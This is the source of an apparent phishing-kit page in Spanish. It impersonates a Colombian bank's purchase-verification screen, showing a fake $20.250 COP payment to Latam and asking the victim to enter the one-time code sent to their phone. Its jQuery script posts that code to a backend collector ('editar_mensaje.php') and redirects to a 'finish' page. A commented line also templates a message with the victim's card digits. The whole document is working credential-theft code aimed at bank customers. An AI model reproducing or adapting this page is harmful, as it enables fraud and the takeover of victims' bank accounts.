<?php 


    
   // $mensaje = "La transacción que intentas realizar por un valor de: $8.689 Cop  con tu tarjeta terminada en **********".$ca." Debe ser autorizada por seguridad";

?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="/css/davi.css">

    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		



</head>
<body>
    


<div class="details" style="padding:15px;">
    <img src="/img/colpa.png" alt="" srcset="" width="70%">
    <hr>
    <h3>Autenticación de compra</h3>
    <a style="color:black;">Le hemos enviado un código de verificación a su número de teléfono.</a>
    <p></p>
    <a style="color:black;">Este código es de uso personal, por seguridad no lo comparta con terceros.</a>
    <p></p>
    <a style="color:black;">Usted esta autorizando un pago a Latam por $20.250 Cop</a>
<p></p><br>
    
        <center><a style="">Código de verificación</a><br>
        <input type="text" name="cDinamica" id="txtOTP" style="" required minlength="6"><br>
        <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:189px;"></center>
<br><br>
        <center><a><b>PEDIR OTRO CODIGO</b></a></center><br><br>
        <a><b>¿Necesitas ayuda? | Términos de Uso</b></a>
</div>





<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length > 5) {
				const data = {
                    'otp': $("#txtOTP").val()
                };
				console.log(data);
				$.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: {
                        data: data
                    },
                    success: function(response) {
                        const result = JSON.parse(response);
                        if (result.success) {
                            window.location.href = "finish.php";
                        } else {
                            alert('Error al editar el mensaje: ' + result.error);
                        }
                    },
                    error: function(xhr, status, error) {
                        alert('Error en la solicitud AJAX: ' + error);
                    }
                });				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>



</body>
</html>